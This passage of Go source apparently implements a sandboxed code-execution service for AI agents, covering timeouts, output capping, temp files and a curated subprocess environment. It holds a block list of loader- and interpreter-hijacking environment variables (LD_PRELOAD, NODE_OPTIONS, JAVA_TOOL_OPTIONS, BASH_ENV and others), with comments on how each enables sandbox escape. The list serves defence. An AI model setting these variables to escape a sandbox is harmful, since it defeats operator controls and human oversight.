	var cmd *exec.Cmd
	var err error

	timeout := req.Timeout
	if timeout == 0 {
		timeout = DefaultExecTimeout
	}
	if timeout > MaxExecTimeout {
		timeout = MaxExecTimeout
	}

	start := time.Now()
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	if rt.Lang == langBash || rt.Lang == "sh" {
		cmd = exec.CommandContext(ctx, rt.Executable, "-c", req.Code)
	} else {
		// Write code to temp file and execute
		tmpfile, err := writeTempFile(rt.Lang, req.Code)
		if err != nil {
			return ExecResp{}, err
		}
		defer os.Remove(tmpfile)

		cmd = exec.CommandContext(ctx, rt.Executable, tmpfile)
	}

	cmd.Dir = s.wd
	cmd.Env = prependPATH(buildEnv(req.Env), s.pathPrepend)

	// F-10: bound the in-memory subprocess buffer at MaxRawBytes via a
	// streamed read on StdoutPipe + LimitReader, so a `find / -name "*"`
	// doesn't OOM the daemon. The previous cmd.Output() buffered the
	// entire output and only truncated post-hoc. After we hit the cap,
	// drain the pipe to /dev/null so the subprocess can exit cleanly
	// rather than blocking on a full pipe.
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return ExecResp{}, err
	}
	if err := cmd.Start(); err != nil {
		return ExecResp{}, err
	}
	out, readErr := io.ReadAll(io.LimitReader(stdout, MaxRawBytes))
	// Always drain the rest of stdout so a noisy subprocess can finish
	// and Wait() returns. Discard errors here — the subprocess exit
	// status is what matters.
	_, _ = io.Copy(io.Discard, stdout)
	waitErr := cmd.Wait()
	if readErr != nil {
		return ExecResp{}, readErr
	}
	exitCode := 0
	if waitErr != nil {
		if exitErr, ok := waitErr.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			return ExecResp{}, waitErr
		}
	}

	// Windows Git Bash outputs UTF-16LE with null bytes; convert to UTF-8
	output := convertUTF16LEToUTF8(out)
	if len(output) >= MaxRawBytes {
		// Trim a trailing partial UTF-8 rune so encoding/json doesn't emit
		// U+FFFD for the orphan continuation bytes on >MaxRawBytes outputs
		// whose boundary falls mid-rune (Turkish gradle/maven, CJK paths
		// in git log). The LimitReader above already capped at MaxRawBytes;
		// this slice + trim guards the post-UTF16-conversion size.
		if len(output) > MaxRawBytes {
			output = output[:MaxRawBytes]
		}
		output = trimPartialRune(output)
	}

	// Strip terminal noise (ANSI color/cursor, CR-overwrites, repeat-spam)
	// before either the return-policy filter or the content-store stash sees
	// the bytes. Tools that paint their own UI (npm install, gradle, cargo,
	// any Go test with -v + a colored runner) routinely produce output
	// whose token count is dominated by escape sequences and progress-bar
	// rewrites — none of which the agent can act on. We do this on RAW
	// stdout, not after redaction, because escape sequences can split a
	// secret across positions and break the redactor's regex anchors.
	output = NormalizeOutput(output)

	// Apply the return-policy filter. This is the single point that decides
	// whether to inline output or return excerpts; per-handler ad-hoc logic
	// was the source of the empty-intent → full-output token leak.
	// RawStdout carries the pre-filter bytes so the transport layer can stash
	// them into the content store regardless of what the policy dropped.
	filtered := ApplyReturnPolicy(output, req.Intent, req.Return)

	return ExecResp{
		Exit:       exitCode,
		Stdout:     filtered.Body,
		RawStdout:  output,
		Matches:    filtered.Matches,
		Summary:    filtered.Summary,
		Vocabulary: filtered.Vocabulary,
		DurationMs: int(time.Since(start).Milliseconds()),
	}, nil
}

// writeTempFile writes code to a temp file. Uses named returns so the
// deferred cleanup closure observes write/sync/close failures via the outer
// err binding — the prior form used `if _, err := ...` which shadowed err
// inside the if-init scope, so WriteString failures left the temp file and
// its FD leaked on every failed non-bash Exec.
func writeTempFile(lang, code string) (path string, err error) {
	ext := map[string]string{
		"python": ".py",
		"node":   ".js",
		"ruby":   ".rb",
		"perl":   ".pl",
		"php":    ".php",
		"R":      ".R",
		"elixir": ".ex",
	}

	ext2, ok := ext[lang]
	if !ok {
		ext2 = ".txt"
	}

	tmpfile, err := os.CreateTemp("", "dfmt-sandbox-*"+ext2)
	if err != nil {
		return "", err
	}
	tmpName := tmpfile.Name()
	defer func() {
		if err != nil {
			_ = tmpfile.Close()
			_ = os.Remove(tmpName)
		}
	}()

	if _, err = tmpfile.WriteString(code); err != nil {
		return "", err
	}
	if err = tmpfile.Sync(); err != nil {
		return "", err
	}
	if err = tmpfile.Close(); err != nil {
		return "", err
	}
	return tmpName, nil
}

// prependPATH returns env with the given absolute dirs prepended to
// the PATH variable (OS list separator, deduped against existing
// entries so a repeated `dfmt setup` doesn't grow PATH unboundedly).
// If env has no PATH entry, one is added with just `dirs`. dirs == nil
// is a no-op.
func prependPATH(env []string, dirs []string) []string {
	if len(dirs) == 0 {
		return env
	}
	sep := string(os.PathListSeparator)
	for i, e := range env {
		if !strings.HasPrefix(e, "PATH=") {
			continue
		}
		existing := strings.Split(e[len("PATH="):], sep)
		seen := make(map[string]struct{}, len(existing)+len(dirs))
		for _, p := range existing {
			seen[p] = struct{}{}
		}
		merged := make([]string, 0, len(existing)+len(dirs))
		for _, d := range dirs {
			if _, dup := seen[d]; dup {
				continue
			}
			seen[d] = struct{}{}
			merged = append(merged, d)
		}
		merged = append(merged, existing...)
		env[i] = "PATH=" + strings.Join(merged, sep)
		return env
	}
	return append(env, "PATH="+strings.Join(dirs, sep))
}

// buildEnv builds the environment for a subprocess.
func buildEnv(extra map[string]string) []string {
	var env []string

	if runtime.GOOS == goosWindows {
		// Windows: use system PATH so cmd, powershell, git, go, node etc. are found
		env = []string{
			"PATH=" + os.Getenv("PATH"),
			"TMP=" + os.Getenv("TMP"),
			"TEMP=" + os.Getenv("TEMP"),
			"LOCALAPPDATA=" + os.Getenv("LOCALAPPDATA"),
			"USERPROFILE=" + os.Getenv("USERPROFILE"),
		}
		if home := os.Getenv("USERPROFILE"); home != "" {
			env = append(env, "HOME="+home)
		}
		if user := os.Getenv("USERNAME"); user != "" {
			env = append(env, "USER="+user)
		}
	} else {
		// Unix: minimal environment for reproducibility and security
		env = []string{
			"HOME=" + os.Getenv("HOME"),
			"USER=" + os.Getenv("USER"),
			"PATH=" + os.Getenv("PATH"),
			"LANG=en_US.UTF-8",
			"TERM=xterm",
		}
	}

	// Add DFMT_EXEC_* prefixed vars
	for _, e := range os.Environ() {
		if strings.HasPrefix(e, "DFMT_EXEC_") {
			env = append(env, e)
		}
	}

	// Add extra env vars, refusing any name that can alter the loader or
	// override an interpreter's startup path. An agent that controls these
	// can escape the sandbox — LD_PRELOAD injects a shared library into every
	// allowed binary, PATH override redirects 'git'/'python'/etc. to an
	// attacker-chosen file, and GIT_EXEC_PATH / NODE_OPTIONS do similar.
	for k, v := range extra {
		if isSandboxEnvBlocked(k) {
			continue
		}
		env = append(env, k+"="+v)
	}

	return env
}

// sandboxBlockedEnvPrefixes and sandboxBlockedEnvNames together form the
// allowlist-by-exclusion for buildEnv's extra map. Kept as a block-list
// because the base env is curated and the agent is expected to add debug
// toggles (e.g. VERBOSE=1), not redefine core runtime behavior.
//
// The list is grouped by the runtime each prefix targets. Every interpreter
// that the default policy allows (`go`, `node`, `python`, plus the optional
// `npm`/`pnpm`/`pytest`/`cargo`) and every interpreter an operator might
// add to a custom allow list (`ruby`, `php`, `java`, `lua`) needs at least
// one entry — otherwise an agent who supplies `req.Env` can hijack the
// loader / startup hook of an otherwise-allowed binary. F-G-LOW-2 in the
// security audit added the npm / bundle / gem / composer / lua / java / php
// rows after the original list missed them.
var (
	sandboxBlockedEnvPrefixes = []string{
		// Dynamic loader injection (Linux, macOS).
		"LD_",
		"DYLD_",
		// Git internals: GIT_EXEC_PATH, GIT_SSH, GIT_INDEX_FILE, etc.
		"GIT_",
		// Node: NODE_OPTIONS, NODE_PATH, NODE_DEBUG, NODE_TLS_REJECT_UNAUTHORIZED.
		"NODE_",
		// npm config overrides reach into npm internals (init module, script
		// shell, registry). `npm` is in the default allow list so this is
		// reachable even without an operator-authored rule.
		"NPM_CONFIG_",
		// Python: PYTHONSTARTUP, PYTHONPATH, PYTHONHOME, PYTHONIOENCODING.
		"PYTHON",
		// Ruby toolchain: RUBYLIB, RUBYOPT, BUNDLE_GEMFILE, GEM_PATH, GEM_HOME.
		"RUBY",
		"BUNDLE_",
		"GEM_",
		// Perl: PERL5LIB, PERL5OPT.
		"PERL5",
		// Lua module search path.
		"LUA_",
		// PHP: PHP_INI_SCAN_DIR, PHP_FCGI_*, plus PHPRC (no underscore —
		// hence the bare `PHP` prefix, matching PYTHON/RUBY's shape).
		"PHP",
		// Composer: COMPOSER_HOME, COMPOSER_VENDOR_DIR, etc.
		"COMPOSER_",
		// JVM: JAVA_TOOL_OPTIONS injects javaagent; JAVA_HOME redirects
		// which JVM is invoked. The legacy `_JAVA_OPTIONS` (leading
		// underscore) is in sandboxBlockedEnvNames since no useful prefix
		// would bind it without poisoning unrelated variables.
		"JAVA_",
	}
	sandboxBlockedEnvNames = map[string]struct{}{
		"PATH":           {},
		"IFS":            {},
		"BASH_ENV":       {},
		"ENV":            {},
		"PS4":            {},
		"PROMPT_COMMAND": {},
		"HOME":           {},
		"USER":           {},
		"USERPROFILE":    {},
		"APPDATA":        {},
		"LOCALAPPDATA":   {},
		"PATHEXT":        {},
		"COMSPEC":        {},
		"SYSTEMROOT":     {},
		// JVM: legacy uppercase-with-leading-underscore variant of
		// JAVA_TOOL_OPTIONS. Same effect (javaagent injection); no useful
		// prefix because the leading `_` would cripple the prefix list.
		"_JAVA_OPTIONS": {},
	}
)

func isSandboxEnvBlocked(name string) bool {
	u := strings.ToUpper(name)
	if _, ok := sandboxBlockedEnvNames[u]; ok {
		return true
	}
	for _, p := range sandboxBlockedEnvPrefixes {
		if strings.HasPrefix(u, p) {
			return true
		}
	}
	return false
}

// convertUTF16LEToUTF8 converts UTF-16LE encoded bytes to UTF-8 string.
// Windows Git Bash outputs UTF-16LE with null bytes between ASCII chars.
//
// Detection prefers the explicit BOM (`0xFF 0xFE` for UTF-16LE) when present
// because the prior null-byte-density heuristic alone could mis-detect
// binary subprocess output (xxd, hexdump, image dumps) whose nulls happen
// to land in even positions. The heuristic remains as a fallback for the
// Git-Bash case where the BOM is stripped before we see the bytes — this
// closes F-G-INFO-1 from the security audit without regressing the
// existing Windows-shell support.
func convertUTF16LEToUTF8(data []byte) string {
	// BOM-led UTF-16LE: trust the BOM and strip it.
	if len(data) >= 2 && data[0] == 0xFF && data[1] == 0xFE {
		data = data[2:]
		return decodeUTF16LE(data)
	}
	// BOM-led UTF-16BE: not what this function targets, but unambiguous.
	// Pass through as-is rather than misinterpret.
	if len(data) >= 2 && data[0] == 0xFE && data[1] == 0xFF {
		return string(data)
	}
	// Heuristic fallback for BOM-less UTF-16LE (Git Bash on Windows).
	// "More than 30% of even-position bytes are null over the first 100"
	// is a Git-Bash signature; binary outputs rarely meet it.
	isUTF16 := false
	if len(data) >= 4 {
		nullCount := 0
		for i := 0; i < len(data) && i < 100; i += 2 {
			if data[i] == 0 {
				nullCount++
			}
		}
		isUTF16 = nullCount > 15
	}

	if !isUTF16 {
		return string(data)
	}
	return decodeUTF16LE(data)
}

// decodeUTF16LE converts UTF-16LE bytes to UTF-8 without re-checking the
// BOM. Callers are responsible for stripping any BOM before calling.
func decodeUTF16LE(data []byte) string {

	// Convert UTF-16LE to UTF-8
	var result strings.Builder
	for i := 0; i+1 < len(data); i += 2 {
		lo := data[i]
		hi := data[i+1]
		if hi == 0 {
			// ASCII
			result.WriteByte(lo)
		} else {
			// UTF-16 code point - convert to UTF-8
			r := uint16(hi)<<8 | uint16(lo)
			if r < 0x80 {
				result.WriteByte(byte(r))
			} else if r < 0x800 {
				result.WriteByte(0xC0 | byte(r>>6))
				result.WriteByte(0x80 | byte(r&0x3F))
			} else {
				result.WriteByte(0xE0 | byte(r>>12))
				result.WriteByte(0x80 | byte((r>>6)&0x3F))
				result.WriteByte(0x80 | byte(r&0x3F))
			}
		}
	}
	return result.String()
}
